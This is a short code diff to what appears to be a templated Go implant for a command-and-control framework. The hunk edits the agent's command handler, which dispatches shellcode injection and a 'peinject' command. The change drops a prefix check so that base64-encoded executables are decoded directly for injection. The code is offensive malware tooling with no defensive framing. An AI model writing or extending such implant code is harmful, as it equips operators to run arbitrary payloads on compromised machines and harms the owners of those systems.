@@ -32,13 +32,9 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) strin
         result := a.{AGENT_INJECT_SHELLCODE_FUNC}(shellcodeData)
         return result
     } else if strings.HasPrefix(command, "peinject ") {
-        // Handle PE injection command - check for 'pe' prefix
+        // Handle PE injection command - base64 content follows directly after "peinject "
         encodedPE := command[9:] // Remove "peinject " prefix
-        if len(encodedPE) < 2 || !strings.HasPrefix(encodedPE, "pe") {
-            return "[ERROR] PE injection command must start with 'pe' prefix"
-        }
-        encodedData := encodedPE[2:] // Remove "pe" prefix
-        peData, err := base64.StdEncoding.DecodeString(encodedData)
+        peData, err := base64.StdEncoding.DecodeString(encodedPE)
         if err != nil {
             return fmt.Sprintf("[ERROR] Invalid PE data format: %v", err)
         }
